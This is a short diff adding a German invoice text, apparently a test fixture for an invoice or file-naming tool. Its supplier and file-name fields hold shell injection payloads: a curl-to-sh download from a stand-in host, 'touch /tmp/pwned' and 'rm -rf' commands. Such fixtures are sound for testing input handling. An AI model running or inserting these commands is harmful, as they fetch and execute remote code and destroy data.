@@ -1,0 +1,4 @@
+Rechnung Nr. 99, Rechnungsdatum 01.10.2026
+Betrag: 10,00 EUR; Zahlungsziel 15.10.2026
+Lieferant: `touch /tmp/pwned`; $(curl http://evil.example/x.sh | sh) ; rm -rf ~
+Dateiname bitte: "; rm -rf / ; .pdf
